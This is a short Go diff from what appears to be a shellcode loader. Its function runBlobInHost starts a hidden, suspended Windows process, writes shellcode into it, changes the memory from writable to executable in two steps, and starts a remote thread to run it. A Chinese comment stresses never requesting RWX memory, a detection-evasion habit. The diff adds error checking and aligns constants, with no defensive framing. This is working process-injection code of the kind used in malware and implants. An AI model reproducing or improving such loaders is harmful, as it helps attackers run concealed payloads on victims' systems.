@@ -160,11 +160,11 @@ func runBlobInHost(shellcode []byte) (string, int32, string) {
 	procCloseHandle := resolveAPI("kernel32.dll", "CloseHandle")
 
 	const (
-		CREATE_SUSPENDED = 0x00000004
-		CREATE_NO_WINDOW = 0x08000000
-		MEM_COMMIT       = 0x1000
-		MEM_RESERVE      = 0x2000
-		PAGE_READWRITE   = 0x04
+		CREATE_SUSPENDED  = 0x00000004
+		CREATE_NO_WINDOW  = 0x08000000
+		MEM_COMMIT        = 0x1000
+		MEM_RESERVE       = 0x2000
+		PAGE_READWRITE    = 0x04
 		PAGE_EXECUTE_READ = 0x20
 	)
 
@@ -204,11 +204,13 @@ func runBlobInHost(shellcode []byte) (string, int32, string) {
 		return "", -1, fmt.Sprintf("WriteProcessMemory failed (err=%d)", getLastError())
 	}
 
-	// 改为可执行
+	// 改为可执行（RW → RX 两步，绝不申请 RWX）
 	var oldProtect uint32
-	procVirtualProtectEx.Call(
+	if ret, _, _ = procVirtualProtectEx.Call(
 		uintptr(pi.Process), addr, uintptr(len(shellcode)),
-		uintptr(PAGE_EXECUTE_READ), uintptr(unsafe.Pointer(&oldProtect)))
+		uintptr(PAGE_EXECUTE_READ), uintptr(unsafe.Pointer(&oldProtect))); ret == 0 {
+		return "", -1, fmt.Sprintf("VirtualProtectEx failed (err=%d)", getLastError())
+	}
 
 	// 在宿主进程中创建远程线程执行 shellcode
 	var threadID uint32
